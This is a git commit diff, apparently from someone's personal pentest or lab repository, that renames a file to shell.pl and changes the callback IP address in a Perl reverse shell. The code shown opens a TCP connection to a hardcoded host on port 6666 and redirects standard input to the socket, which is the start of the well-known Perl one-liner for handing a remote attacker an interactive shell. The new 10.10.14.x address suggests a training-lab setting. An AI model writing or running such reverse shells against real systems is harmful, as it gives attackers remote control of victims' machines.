bdeb74fc7fb401365c5ff26c92e61f9b37cd1a60
MattyW11 <matthewwllms17@gmail.com>
2021-01-19 12:43:42 +0000

    Update and rename perl.pl to shell.pl

--- shell.pl
+++ shell.pl
@@ -1,6 +1,6 @@
 #!/usr/bin/perl -w
 use Socket;
-$i="192.168.0.22";
+$i="10.10.14.85";
 $p=6666;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
 if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
